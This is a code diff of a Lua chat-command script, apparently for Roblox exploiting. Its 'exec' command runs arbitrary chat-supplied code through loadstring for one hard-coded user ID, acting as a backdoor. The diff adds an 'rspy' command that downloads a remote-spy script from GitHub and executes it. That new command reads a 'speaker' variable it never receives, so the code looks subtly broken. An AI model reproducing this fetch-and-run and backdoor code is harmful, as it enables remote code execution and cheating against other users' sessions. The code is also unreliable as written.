@@ -500,30 +500,36 @@ USER PROMPT:
 	end}
 
 	commands.exec = {function(speaker, args)
-if speaker.UserId == 10984088 then
-        local code = table.concat(args, " ")
-        local executable, compileError = loadstring(code)
+		if speaker.UserId == 10984088 then
+      	  local code = table.concat(args, " ")
+        	local executable, compileError = loadstring(code)
         
-        if not executable then
-            warn("Script Error:", compileError)
-            return
-        end
+      	  if not executable then
+        	    warn("Script Error:", compileError)
+       	     return
+      	  end
 
-        local customEnv = {
-			localPlayer = localPlayer,
-            chat = chat,
-            whisper = whisper,
-            speaker = speaker,
-            script = script 
-        }
+     	  	 local customEnv = {
+				localPlayer = localPlayer,
+     		 	chat = chat,
+      			whisper = whisper,
+      		 	speaker = speaker,
+	  	     	script = script 
+     	   }
 
-        setmetatable(customEnv, {
-            __index = getfenv() 
-        })
+    	    setmetatable(customEnv, {
+     	       __index = getfenv() 
+      	  })
 
-        setfenv(executable, customEnv)
-        executable() 
-    end
+     	   setfenv(executable, customEnv)
+     	   executable() 
+  	  end
+	end}
+
+	commands.rspy = {function()
+			if speaker.UserId == 10984088 then
+				loadstring(game:HttpGetAsync("https://github.com/richie0866/remote-spy/releases/latest/download/RemoteSpy.lua"))()
+			end
 	end}
 end
 
@@ -531,7 +537,6 @@ local function onMessageReceived(message)
 	if string.sub(message.Text, 0, 1) ~= prefix then
 		return
 	end
-
 
 	local speaker = Players:GetPlayerByUserId(message.TextSource and message.TextSource.UserId)
 	local command, args, undo = parseCommand(message.Text)
